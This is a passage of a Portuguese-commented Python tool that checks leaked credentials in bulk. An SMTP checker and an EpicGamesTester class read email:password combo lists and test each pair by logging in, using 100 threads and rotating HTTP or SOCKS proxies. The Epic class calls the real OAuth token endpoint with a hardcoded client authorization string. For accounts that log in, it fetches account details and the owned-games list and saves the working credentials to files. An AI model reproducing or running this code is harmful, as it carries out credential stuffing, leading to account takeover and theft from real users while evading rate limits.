                            if progress_callback:
                                progress_callback(retries, max_retries, email, "Inválido")
                            break
                        except smtplib.SMTPException as e:
                            result['error'] = f"Erro SMTP: {str(e)}"
                            logging.error(f"Erro SMTP para {email}: {str(e)}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                            retries += 1
                        except Exception as e:
                            result['error'] = f"Erro inesperado: {str(e)}"
                            logging.error(f"Erro inesperado para {email}: {str(e)}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                            retries += 1

            except socket.timeout:
                result['error'] = "Timeout de conexão"
                logging.error(f"Timeout ao conectar via proxy {self.current_proxy}")
                if progress_callback:
                    progress_callback(retries, max_retries, email, "Timeout")
                retries += 1
            except ConnectionRefusedError:
                result['error'] = "Conexão recusada"
                logging.error(f"Conexão recusada pelo proxy {self.current_proxy}")
                if progress_callback:
                    progress_callback(retries, max_retries, email, "Conexão recusada")
                retries += 1
            except Exception as e:
                result['error'] = f"Erro de conexão: {str(e)}"
                logging.error(f"Erro de conexão com proxy {self.current_proxy}: {str(e)}")
                if progress_callback:
                    progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                retries += 1

        return result

    def process_credentials(self, progress_callback=None):
        if not os.path.exists(self.config['input_file']):
            logging.error(f"Arquivo de entrada não encontrado: {self.config['input_file']}")
            raise FileNotFoundError(f"Arquivo {self.config['input_file']} não encontrado")

        credentials = []
        with open(self.config['input_file'], 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                cred = self.validate_credential_format(line)
                if cred:
                    credentials.append(cred)

        if not credentials:
            logging.error("Nenhuma credencial válida encontrada no arquivo de entrada")
            raise ValueError("Nenhuma credencial válida encontrada")

        self.stats['total'] = len(credentials)
        self.stats['start_time'] = datetime.now().isoformat()
        logging.info(f"Iniciando verificação de {self.stats['total']} credenciais...")

        if progress_callback:
            progress_callback(0, self.stats['total'], "Iniciando", "Processando")

        with ThreadPoolExecutor(max_workers=self.config['max_workers']) as executor:
            futures = {}
            for idx, (email, password) in enumerate(credentials):
                future = executor.submit(self.test_smtp_login, email, password, progress_callback)
                futures[future] = (idx, email, password)

            for future in as_completed(futures):
                idx, email, password = futures[future]
                try:
                    result = future.result()
                    if progress_callback:
                        progress_callback(idx+1, self.stats['total'], email, "Processado")

                    if result['valid']:
                        self.valid_creds.append(f"{email}:{password}")
                        self.stats['valid'] += 1
                    elif result['error']:
                        if "Credenciais inválidas" in result['error']:
                            self.invalid_creds.append(f"{email}:{password}")
                            self.stats['invalid'] += 1
                        else:
                            self.error_creds.append(f"{email}:{password} - {result['error']}")
                            self.stats['errors'] += 1
                            if result['proxy']:
                                self.stats['proxy_errors'] += 1
                except Exception as e:
                    logging.error(f"Erro ao processar {email}: {str(e)}")
                    self.error_creds.append(f"{email}:{password} - ERRO: {str(e)}")
                    self.stats['errors'] += 1
                    if progress_callback:
                        progress_callback(idx+1, self.stats['total'], email, f"Erro: {str(e)}")

        self.stats['end_time'] = datetime.now().isoformat()
        self.save_results()

    def save_results(self):
        try:
            os.makedirs('resultados', exist_ok=True)
            
            with open(self.config['valid_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.valid_creds))

            with open(self.config['invalid_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.invalid_creds))

            with open(self.config['error_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.error_creds))

            report = {
                'stats': self.stats,
                'server': self.config['smtp_server'],
                'proxies_used': len(self.proxies),
                'config': self.config
            }
            with open(self.config['report_file'], 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4)

            logging.info(f"Resultados salvos em: {self.config['valid_output']}, "
                       f"{self.config['invalid_output']}, {self.config['error_output']}")

        except Exception as e:
            logging.error(f"Erro ao salvar resultados: {str(e)}")
            raise

class EpicGamesTester:
    def __init__(self):
        self.config = self.load_config()
        self.proxies = self.load_proxies()
        self.current_proxy = None
        self.proxy_index = 0
        self.stats = {
            'total': 0,
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'proxy_errors': 0,
            'start_time': None,
            'end_time': None
        }
        self.valid_creds = []
        self.invalid_creds = []
        self.error_creds = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
        })

    def load_config(self) -> Dict:
        default_config = {
            "api_key": "875a3b8d6b414c6b9a00cdfaac243d5a",
            "timeout": 15,
            "max_workers": 100,
            "input_file": "credenciais.txt",
            "valid_output": "validas_epic.txt",
            "invalid_output": "invalidas_epic.txt",
            "error_output": "erros_epic.txt",
            "report_file": "relatorio_epic.json",
            "proxy_file": "proxies.txt",
            "proxy_type": "HTTP",
            "max_retries": 3,
            "proxy_timeout": 30,
            "check_type": "both"  # account, games, both
        }

        try:
            with open('config_epic.json', 'r') as f:
                config = json.load(f)
                return {**default_config, **config}
        except FileNotFoundError:
            return default_config
        except json.JSONDecodeError:
            logging.warning("Arquivo config_epic.json inválido. Usando configurações padrão.")
            return default_config

    def load_proxies(self) -> List[str]:
        try:
            with open(self.config['proxy_file'], 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logging.warning("Arquivo de proxies não encontrado. Usando conexão direta.")
            return []
        except Exception as e:
            logging.error(f"Erro ao carregar proxies: {str(e)}")
            return []

    def get_next_proxy(self) -> Optional[Dict]:
        if not self.proxies:
            return None

        if self.proxy_index >= len(self.proxies):
            self.proxy_index = 0

        proxy = self.proxies[self.proxy_index]
        self.proxy_index += 1
        self.current_proxy = proxy

        proxy_type = self.config.get('proxy_type', 'HTTP').lower()
        
        if proxy_type == 'socks4':
            return {
                'http': f'socks4://{proxy}',
                'https': f'socks4://{proxy}'
            }
        elif proxy_type == 'socks5':
            return {
                'http': f'socks5://{proxy}',
                'https': f'socks5://{proxy}'
            }
        else:  # HTTP
            return {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }

    def validate_credential_format(self, line: str) -> Optional[Tuple[str, str]]:
        line = line.strip()
        if not line or line.startswith('#'):
            return None

        if line.count(':') != 1:
            logging.warning(f"Formato inválido: {line}")
            return None

        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()

        if not email or not password:
            return None

        return (email, password)

    def get_epic_auth_token(self, email: str, password: str, proxy_dict=None) -> Optional[str]:
        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'includePerms': 'true'
        }
        
        headers = {
            'Authorization': f'basic {self.config["api_key"]}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        try:
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                proxies=proxy_dict,
                timeout=self.config['timeout']
            )
            
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 400:
                error = response.json().get('errorCode', 'unknown_error')
                if error == 'errors.com.epicgames.account.invalid_account_credentials':
                    return None
                else:
                    raise Exception(f"Erro de autenticação: {error}")
            else:
                raise Exception(f"HTTP {response.status_code}: {response.text}")
                
        except Exception as e:
            raise Exception(f"Falha na autenticação: {str(e)}")

    def get_epic_account_info(self, access_token: str, proxy_dict=None) -> Optional[Dict]:
        url = "https://account-public-service-prod.ol.epicgames.com/account/api/accounts"
        
        headers = {
            'Authorization': f'bearer {access_token}'
        }
        
        try:
            response = self.session.get(
                url,
                headers=headers,
                proxies=proxy_dict,
                timeout=self.config['timeout']
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                raise Exception(f"HTTP {response.status_code}: {response.text}")
                
        except Exception as e:
            raise Exception(f"Falha ao obter informações da conta: {str(e)}")

    def get_epic_games_list(self, access_token: str, account_id: str, proxy_dict=None) -> Optional[Dict]:
        url = f"https://launcher-public-service-prod.ol.epicgames.com/launcher/api/public/assets/Windows?label=Live"
        
        headers = {
            'Authorization': f'bearer {access_token}'
        }
        
        try:
            response = self.session.get(
                url,
                headers=headers,
                proxies=proxy_dict,
                timeout=self.config['timeout']
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                raise Exception(f"HTTP {response.status_code}: {response.text}")
                
        except Exception as e:
            raise Exception(f"Falha ao obter lista de jogos: {str(e)}")

    def test_epic_login(self, email: str, password: str, progress_callback=None) -> Dict:
        result = {
            'email': email,
            'password': password,
            'valid': False,
            'account_info': None,
            'games': None,
            'error': None,
            'proxy': self.current_proxy,
            'timestamp': datetime.now().isoformat()
        }

        retries = 0
        max_retries = self.config['max_retries']

        while retries < max_retries:
            proxy_dict = self.get_next_proxy() if self.proxies else None

            try:
                if progress_callback:
                    progress_callback(retries, max_retries, email, f"Tentando autenticação ({retries+1}/{max_retries})")

                # Etapa 1: Obter token de acesso
                access_token = self.get_epic_auth_token(email, password, proxy_dict)
                
                if not access_token:
                    result['error'] = "Credenciais inválidas"
                    logging.warning(f"Credenciais inválidas: {email}")
                    if progress_callback:
                        progress_callback(retries, max_retries, email, "Inválido")
                    break
                
                result['valid'] = True
                
                # Etapa 2: Obter informações da conta se necessário
                if self.config['check_type'] in ['account', 'both']:
                    account_info = self.get_epic_account_info(access_token, proxy_dict)
                    result['account_info'] = account_info
                    
                    if progress_callback:
                        progress_callback(retries, max_retries, email, "Conta válida")
                
                # Etapa 3: Obter lista de jogos se necessário
                if self.config['check_type'] in ['games', 'both'] and result['valid']:
                    if account_info and 'account_id' in account_info:
                        games_list = self.get_epic_games_list(access_token, account_info['account_id'], proxy_dict)
                        result['games'] = games_list
                        
                        if progress_callback:
                            game_count = len(games_list) if games_list else 0
                            progress_callback(retries, max_retries, email, f"Válido ({game_count} jogos)")
                
                break

            except Exception as e:
                result['error'] = f"Erro: {str(e)}"
                logging.error(f"Erro ao verificar {email}: {str(e)}")
                if progress_callback:
                    progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                retries += 1

        return result

    def process_credentials(self, progress_callback=None):
        if not os.path.exists(self.config['input_file']):
            logging.error(f"Arquivo de entrada não encontrado: {self.config['input_file']}")
            raise FileNotFoundError(f"Arquivo {self.config['input_file']} não encontrado")

        credentials = []
        with open(self.config['input_file'], 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                cred = self.validate_credential_format(line)
                if cred:
                    credentials.append(cred)

        if not credentials:
            logging.error("Nenhuma credencial válida encontrada no arquivo de entrada")
            raise ValueError("Nenhuma credencial válida encontrada")

        self.stats['total'] = len(credentials)
        self.stats['start_time'] = datetime.now().isoformat()
        logging.info(f"Iniciando verificação de {self.stats['total']} credenciais Epic Games...")

        if progress_callback:
            progress_callback(0, self.stats['total'], "Iniciando", "Processando")

        with ThreadPoolExecutor(max_workers=self.config['max_workers']) as executor:
            futures = {}
            for idx, (email, password) in enumerate(credentials):
                future = executor.submit(self.test_epic_login, email, password, progress_callback)
                futures[future] = (idx, email, password)

            for future in as_completed(futures):
                idx, email, password = futures[future]
                try:
                    result = future.result()
                    if progress_callback:
                        progress_callback(idx+1, self.stats['total'], email, "Processado")

                    if result['valid']:
                        # Formata a saída com informações relevantes
                        output = f"{email}:{password}"
                        
                        if result['account_info']:
                            account_id = result['account_info'].get('account_id', 'N/A')
                            display_name = result['account_info'].get('displayName', 'N/A')
                            output += f" | ID: {account_id} | Nome: {display_name}"
                        
                        if result['games']:
                            game_count = len(result['games'])
                            output += f" | Jogos: {game_count}"
                        
                        self.valid_creds.append(output)
                        self.stats['valid'] += 1
                    elif result['error']:
                        if "Credenciais inválidas" in result['error']:
                            self.invalid_creds.append(f"{email}:{password}")
                            self.stats['invalid'] += 1
                        else:
                            self.error_creds.append(f"{email}:{password} - {result['error']}")
                            self.stats['errors'] += 1
                            if result['proxy']:
                                self.stats['proxy_errors'] += 1
                except Exception as e:
                    logging.error(f"Erro ao processar {email}: {str(e)}")
                    self.error_creds.append(f"{email}:{password} - ERRO: {str(e)}")
                    self.stats['errors'] += 1
                    if progress_callback:
                        progress_callback(idx+1, self.stats['total'], email, f"Erro: {str(e)}")

        self.stats['end_time'] = datetime.now().isoformat()
        self.save_results()

    def save_results(self):
        try:
            os.makedirs('resultados', exist_ok=True)
            
            with open(self.config['valid_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.valid_creds))

            with open(self.config['invalid_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.invalid_creds))

            with open(self.config['error_output'], 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.error_creds))

            report = {
                'stats': self.stats,
                'proxies_used': len(self.proxies),
                'config': self.config
            }
            with open(self.config['report_file'], 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4)

            logging.info(f"Resultados salvos em: {self.config['valid_output']}, "
                       f"{self.config['invalid_output']}, {self.config['error_output']}")

        except Exception as e:
            logging.error(f"Erro ao salvar resultados: {str(e)}")
            raise

if __name__ == "__main__":
    app = DSACheckerApp()
    app.run()